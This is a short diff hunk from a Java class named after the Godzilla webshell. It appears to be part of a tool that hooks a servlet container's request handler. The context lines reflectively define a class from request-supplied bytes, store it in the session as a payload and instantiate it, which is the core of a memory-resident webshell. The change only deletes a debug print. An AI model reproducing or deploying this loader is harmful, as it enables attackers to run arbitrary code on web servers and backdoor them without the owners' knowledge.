@@ -58,7 +58,6 @@ public class GodzillaServletInitialHandlerAdvisor {
                     Class<?> payload = (Class<?>) defineClass.invoke(Thread.currentThread().getContextClassLoader(), data, 0, data.length);
                     session.getClass().getMethod("setAttribute", String.class, Object.class).invoke(session, "payload", payload);
                 } else {
-                    System.out.println(new String(data));
                     request.getClass().getMethod("setAttribute", String.class, Object.class).invoke(request, "parameters", data);
                     ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
                     Object f = ((Class<?>) sessionPayload).newInstance();
